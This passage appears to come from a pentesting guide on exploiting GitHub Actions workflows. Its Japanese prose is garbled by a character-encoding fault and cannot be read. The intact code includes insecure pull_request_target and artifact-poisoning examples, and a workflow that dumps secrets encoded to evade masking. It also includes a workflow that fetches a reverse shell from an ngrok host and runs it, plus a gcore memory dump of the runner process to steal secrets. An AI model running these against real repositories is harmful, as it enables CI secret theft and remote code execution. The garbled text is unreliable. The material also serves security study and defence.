2ã¤ç›®ã®ä¾‹ã¯ã€**ä¿¡é ¼ã§ããªã„** ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ **`workflow_run`** ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã« **ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆ** ã‚’ **æ¸¡ã™** ã“ã¨ã¨ã€ã“ã®ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã®å†…å®¹ã‚’ **RCEã«å¯¾ã—ã¦è„†å¼±** ãªæ–¹æ³•ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

### `workflow_call`

TODO

TODO: `pull_request` ã‹ã‚‰å®Ÿè¡Œã•ã‚ŒãŸã¨ãã«ä½¿ç”¨/ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ãŒå…ƒã®ã‚‚ã®ã§ã‚ã‚‹ã‹ãƒ•ã‚©ãƒ¼ã‚¯ã•ã‚ŒãŸPRã®ã‚‚ã®ã§ã‚ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹

## ãƒ•ã‚©ãƒ¼ã‚¯ã•ã‚ŒãŸå®Ÿè¡Œã®æ‚ªç”¨

å¤–éƒ¨ã®æ”»æ’ƒè€…ãŒGitHubãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’å®Ÿè¡Œã•ã›ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã™ã¹ã¦è¨€åŠã—ã¾ã—ãŸãŒã€æ¬¡ã«ã€ã“ã‚Œã‚‰ã®å®Ÿè¡ŒãŒä¸é©åˆ‡ã«æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

### ä¿¡é ¼ã§ããªã„ãƒã‚§ãƒƒã‚¯ã‚¢ã‚¦ãƒˆå®Ÿè¡Œ

**`pull_request`** ã®å ´åˆã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯ **PRã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ** ã§å®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ï¼ˆ**æ‚ªæ„ã®ã‚ã‚‹PRã®ã‚³ãƒ¼ãƒ‰** ã‚’å®Ÿè¡Œã—ã¾ã™ï¼‰ã€èª°ã‹ãŒ **æœ€åˆã«æ‰¿èªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™** ãã—ã¦ã€ã„ãã¤ã‹ã® [åˆ¶é™](./#pull_request) ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

**`pull_request_target` ã¾ãŸã¯ `workflow_run`** ã‚’ä½¿ç”¨ã™ã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒ **`pull_request_target` ã¾ãŸã¯ `pull_request`** ã‹ã‚‰ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã«ä¾å­˜ã—ã¦ã„ã‚‹å ´åˆã€å…ƒã®ãƒªãƒã‚¸ãƒˆãƒªã®ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**æ”»æ’ƒè€…ã¯å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’åˆ¶å¾¡ã§ãã¾ã›ã‚“**ã€‚

{% hint style="danger" %}
ãŸã ã—ã€**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³** ã« **æ˜ç¤ºçš„ãªPRãƒã‚§ãƒƒã‚¯ã‚¢ã‚¦ãƒˆ** ãŒã‚ã‚Šã€**PRã‹ã‚‰ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹** ï¼ˆãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã§ã¯ãªãï¼‰å ´åˆã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ï¼ˆPRã‚³ãƒ¼ãƒ‰ãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹12è¡Œç›®ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰:
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

æ½œåœ¨çš„ã« **ä¿¡é ¼ã§ããªã„ã‚³ãƒ¼ãƒ‰ã¯ `npm install` ã¾ãŸã¯ `npm build`** ã®é–“ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãƒ“ãƒ«ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨å‚ç…§ã•ã‚ŒãŸ **ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯PRã®è‘—è€…ã«ã‚ˆã£ã¦åˆ¶å¾¡ã•ã‚Œã¦ã„ã¾ã™**ã€‚

{% hint style="warning" %}
è„†å¼±ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã®GitHubãƒ‰ãƒ¼ã‚¯ã¯: `event.pull_request pull_request_target extension:yml` ã§ã™ãŒã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒä¸é©åˆ‡ã«æ§‹æˆã•ã‚Œã¦ã„ã¦ã‚‚ã€å®Ÿè¡Œã•ã‚Œã‚‹ã‚¸ãƒ§ãƒ–ã‚’å®‰å…¨ã«æ§‹æˆã™ã‚‹æ–¹æ³•ã¯ã„ãã¤ã‹ã‚ã‚Šã¾ã™ï¼ˆPRã‚’ç”Ÿæˆã™ã‚‹ã‚¢ã‚¯ã‚¿ãƒ¼ãŒèª°ã§ã‚ã‚‹ã‹ã«é–¢ã™ã‚‹æ¡ä»¶ã‚’ä½¿ç”¨ã™ã‚‹ãªã©ï¼‰ã€‚
{% endhint %}

### ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

ç‰¹å®šã® [**GitHubã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) ã®å€¤ã¯ã€PRã‚’ä½œæˆã™ã‚‹ **ãƒ¦ãƒ¼ã‚¶ãƒ¼** ã«ã‚ˆã£ã¦ **åˆ¶å¾¡ã•ã‚Œã¦ã„ã‚‹** ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚GitHubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒãã® **ãƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ä½•ã‹ã‚’å®Ÿè¡Œã™ã‚‹** å ´åˆã€**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ** ã«ç¹‹ãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨: ç’°å¢ƒå¤‰æ•°ã‚’å®šç¾©ã¾ãŸã¯æ›´æ–°ã—ã€ã“ã‚Œã‚’ **`GITHUB_ENV`** ç’°å¢ƒãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ã“ã¨ã§ã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚¸ãƒ§ãƒ–ã®å¾Œç¶šã®ã‚¹ãƒ†ãƒƒãƒ—ã§ **ç’°å¢ƒå¤‰æ•°ã‚’åˆ©ç”¨å¯èƒ½ã«ã™ã‚‹** ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ãŒã“ã® **env** å¤‰æ•°å†…ã« **ä»»æ„ã®å€¤ã‚’æ³¨å…¥** ã§ãã‚‹å ´åˆã€**LD\_PRELOAD** ã‚„ **NODE\_OPTIONS** ãªã©ã€æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ç’°å¢ƒå¤‰æ•°ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä¾‹ãˆã° ([**ã“ã‚Œ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ã¨ [**ã“ã‚Œ**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project))ã€ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ä¿¡é ¼ã—ã¦ãã®å†…å®¹ã‚’ **`GITHUB_ENV`** ç’°å¢ƒå¤‰æ•°ã«ä¿å­˜ã™ã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’æƒ³åƒã—ã¦ãã ã•ã„ã€‚æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’å¦¥å”ã™ã‚‹ãŸã‚ã«æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### è„†å¼±ãªã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®GitHubã‚¢ã‚¯ã‚·ãƒ§ãƒ³

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**ã“ã®ãƒ–ãƒ­ã‚°è¨˜äº‹**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) ã§è¿°ã¹ãŸã‚ˆã†ã«ã€ã“ã®GitHubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ç•°ãªã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚„ãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

å•é¡Œã¯ã€**`path`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒè¨­å®šã•ã‚Œã¦ã„ãªã„å ´åˆã€ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆãŒç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«æŠ½å‡ºã•ã‚Œã€å¾Œã§ä½¿ç”¨ã¾ãŸã¯å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸Šæ›¸ãã§ãã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆãŒè„†å¼±ãªå ´åˆã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ä¿¡é ¼ã™ã‚‹ä»–ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’å¦¥å”ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

è„†å¼±ãªãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ä¾‹:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
ã“ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã§æ”»æ’ƒã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## ãã®ä»–ã®å¤–éƒ¨ã‚¢ã‚¯ã‚»ã‚¹

### å‰Šé™¤ã•ã‚ŒãŸåå‰ç©ºé–“ã®ãƒªãƒã‚¸ãƒˆãƒªãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯

ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒåå‰ã‚’å¤‰æ›´ã™ã‚‹ã¨ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã®åå‰ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç™»éŒ²ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ãƒªãƒã‚¸ãƒˆãƒªãŒåå‰å¤‰æ›´å‰ã«**100ã‚¹ã‚¿ãƒ¼æœªæº€**ã ã£ãŸå ´åˆã€Githubã¯æ–°ã—ãç™»éŒ²ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå‰Šé™¤ã•ã‚ŒãŸãƒªãƒã‚¸ãƒˆãƒªã¨**åŒã˜åå‰ã®ãƒªãƒã‚¸ãƒˆãƒªã‚’ä½œæˆã™ã‚‹**ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚

{% hint style="danger" %}
ã—ãŸãŒã£ã¦ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå­˜åœ¨ã—ãªã„ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒªãƒã‚¸ãƒˆãƒªã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ãŒãã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å¦¨å®³ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

ä»–ã®ãƒªãƒã‚¸ãƒˆãƒªãŒ**ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ã®ä¾å­˜é–¢ä¿‚ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹**å ´åˆã€æ”»æ’ƒè€…ã¯ãã‚Œã‚‰ã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã¡ã‚‰ã«ã‚ˆã‚Šè©³ç´°ãªèª¬æ˜ãŒã‚ã‚Šã¾ã™: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## ãƒªãƒã‚¸ãƒˆãƒªãƒ”ãƒœãƒ†ã‚£ãƒ³ã‚°

{% hint style="info" %}
ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€æœ€åˆã®ãƒªãƒã‚¸ãƒˆãƒªã«ä½•ã‚‰ã‹ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒã‚ã‚‹ã¨ä»®å®šã—ã¦ã€**1ã¤ã®ãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰åˆ¥ã®ãƒªãƒã‚¸ãƒˆãƒªã«ãƒ”ãƒœãƒƒãƒˆã™ã‚‹**æŠ€è¡“ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ï¼ˆå‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ã€‚
{% endhint %}

### ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã¯**åŒã˜ãƒ–ãƒ©ãƒ³ãƒå†…ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼å®Ÿè¡Œé–“ã§ç¶­æŒã•ã‚Œã¾ã™**ã€‚ã¤ã¾ã‚Šã€æ”»æ’ƒè€…ãŒ**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’å¦¨å®³**ã—ã€ãã‚ŒãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ä¿å­˜ã•ã‚Œã€**ã‚ˆã‚Šç‰¹æ¨©ã®ã‚ã‚‹**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã«ã‚ˆã£ã¦**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ãŠã‚ˆã³å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€ãã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚‚**å¦¨å®³**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯**ä»–ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚„ãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ã®ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ä½¿ç”¨ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ãŒ**ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹Github Actionã‚’å¦¨å®³**ã™ã‚‹ã“ã¨ã«æˆåŠŸã™ã‚Œã°ã€ä»–ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚‚**å¦¨å®³**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰ã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

### OIDCã‚’ä»‹ã—ãŸAWSãŠã‚ˆã³GCPã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### ç§˜å¯†æƒ…å ±ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ <a href="#accessing-secrets" id="accessing-secrets"></a>

ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ³¨å…¥ã—ã¦ã„ã‚‹å ´åˆã€ç§˜å¯†æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã‚’çŸ¥ã£ã¦ãŠãã¨èˆˆå‘³æ·±ã„ã§ã™ï¼š

* ç§˜å¯†æƒ…å ±ã‚„ãƒˆãƒ¼ã‚¯ãƒ³ãŒ**ç’°å¢ƒå¤‰æ•°**ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€**`printenv`**ã‚’ä½¿ç”¨ã—ã¦ç’°å¢ƒã‚’é€šã˜ã¦ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

<details>

<summary>Github Actionå‡ºåŠ›ã®ç§˜å¯†æƒ…å ±ã‚’ãƒªã‚¹ãƒˆã™ã‚‹</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ã£ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒ**å¼ã«ç›´æ¥ä½¿ç”¨ã•ã‚Œã‚‹**å ´åˆã€ç”Ÿæˆã•ã‚ŒãŸã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯**ãƒ‡ã‚£ã‚¹ã‚¯ä¸Š**ã«ä¿å­˜ã•ã‚Œã€ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScriptã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å ´åˆã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯ç’°å¢ƒå¤‰æ•°ã‚’é€šã˜ã¦é€ä¿¡ã•ã‚Œã¾ã™ã€‚
* ```bash
ps axe | grep node
```
* **ã‚«ã‚¹ã‚¿ãƒ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ã®å ´åˆã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒ**å¼•æ•°**ã‹ã‚‰å–å¾—ã—ãŸã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã‹ã«ã‚ˆã£ã¦ãƒªã‚¹ã‚¯ãŒç•°ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### ã‚»ãƒ«ãƒ•ãƒ›ã‚¹ãƒˆãƒ©ãƒ³ãƒŠãƒ¼ã®æ‚ªç”¨

**Github ActionsãŒéGithubã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ã‹ã©ã†ã‹ã‚’è¦‹ã¤ã‘ã‚‹æ–¹æ³•ã¯ã€Github Actionæ§‹æˆyamlå†…ã§**`runs-on: self-hosted`**ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã™ã€‚

**ã‚»ãƒ«ãƒ•ãƒ›ã‚¹ãƒˆ**ãƒ©ãƒ³ãƒŠãƒ¼ã¯ã€**è¿½åŠ ã®æ©Ÿå¯†æƒ…å ±**ã‚„ä»–ã®**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚·ã‚¹ãƒ†ãƒ **ï¼ˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®è„†å¼±ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼Ÿãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚µãƒ¼ãƒ“ã‚¹ï¼Ÿï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€éš”é›¢ã•ã‚Œã¦ç ´å£Šã•ã‚Œã¦ã„ã¦ã‚‚ã€**åŒæ™‚ã«è¤‡æ•°ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§**ãŒã‚ã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒä»–ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚»ãƒ«ãƒ•ãƒ›ã‚¹ãƒˆãƒ©ãƒ³ãƒŠãƒ¼ã§ã¯ã€**\_Runner.Listener**\_\*\*ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒä»»æ„ã®ã‚¹ãƒ†ãƒƒãƒ—ã§ãƒ¡ãƒ¢ãƒªã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦å«ã¾ã‚Œã¾ã™ï¼š
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Check [**ã“ã®æŠ•ç¨¿ã§è©³ç´°æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Githubå†…ã«**Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ“ãƒ«ãƒ‰ã—ã¦ä¿å­˜ã™ã‚‹**Githubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚\
ä»¥ä¸‹ã®å±•é–‹å¯èƒ½ãªä¾‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
